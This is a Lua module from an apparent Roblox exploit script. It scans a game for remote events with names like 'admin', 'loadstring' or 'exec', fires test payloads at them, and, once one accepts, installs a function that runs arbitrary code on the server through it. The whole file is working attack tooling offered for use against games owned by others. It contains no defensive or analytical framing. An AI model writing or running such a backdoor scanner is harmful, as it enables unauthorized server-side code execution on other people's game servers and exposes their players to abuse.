-- ===== STEALTH BACKDOOR OPERATOR =====
local StealthBackdoor = {
    Exploited = false,
    BackdoorObjects = {},
    FoundCommands = {},
}

local function GetScriptSource(scr)
    local success, src = pcall(function()
        if getscriptsource then return getscriptsource(scr) end
        error("no")
    end)
    return success and src or nil
end

function StealthBackdoor:FindRemotes()
    local remotes = {}
    local containers = {ReplicatedStorage, game:GetService("Workspace"), game:GetService("Lighting"), Players.LocalPlayer:FindFirstChild("PlayerGui")}
    local keywords = {"admin","cmd","exec","run","backdoor","bd","eval","loadstring","execute","command","console","op","sudo","give","set","kick","ban","teleport","fly","god","inject","remote","handler"}
    for _, container in ipairs(containers) do
        if container then
            for _, obj in ipairs(container:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local name = obj.Name:lower()
                    for _, kw in ipairs(keywords) do
                        if name:find(kw) then table.insert(remotes, obj) break end
                    end
                end
            end
        end
    end
    self.BackdoorObjects = remotes
    return remotes
end

function StealthBackdoor:TestRemote(remote)
    local testCommands = {"exec", "run", "execute", "eval", "cmd"}
    for _, cmd in ipairs(testCommands) do
        local ok
        if remote:IsA("RemoteEvent") then
            ok = pcall(function() remote:FireServer(cmd, "print('test')") end)
        else
            ok = pcall(function() remote:InvokeServer(cmd, "print('test')") end)
        end
        if ok then
            if not self.FoundCommands[remote] then self.FoundCommands[remote] = {} end
            table.insert(self.FoundCommands[remote], cmd)
            Requiex:Log("Backdoor: "..remote.Name.." accepts "..cmd, Colors.Green)
            return true
        end
        task.wait(0.1)
    end
    return false
end

function StealthBackdoor:ExploitAll()
    local any = false
    for _, remote in ipairs(self.BackdoorObjects) do
        if self:TestRemote(remote) then any = true end
        task.wait(0.2)
    end
    self.Exploited = any
    if any then
        Requiex:Log("Backdoor acquired! Use RUN to execute server code.", Colors.AccentYellow)
        Requiex._execBackdoor = function(code)
            for remote, cmds in pairs(self.FoundCommands) do
                for _, cmd in ipairs(cmds) do
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(cmd, code)
                    else
                        remote:InvokeServer(cmd, code)
                    end
                    return true
                end
            end
            return false
        end
    else
        Requiex:Log("No backdoors found.", Colors.Red)
    end
    return any
end

function StealthBackdoor:SilentScan()
    Requiex:Log("Scanning for backdoors...", Colors.AccentYellow)
    self:FindRemotes()
    if #self.BackdoorObjects > 0 then
        Requiex:Log("Found "..#self.BackdoorObjects.." suspicious remotes, testing...", Colors.SubText)
        self:ExploitAll()
    else
        Requiex:Log("No suspicious remotes detected.", Colors.Red)
    end
end

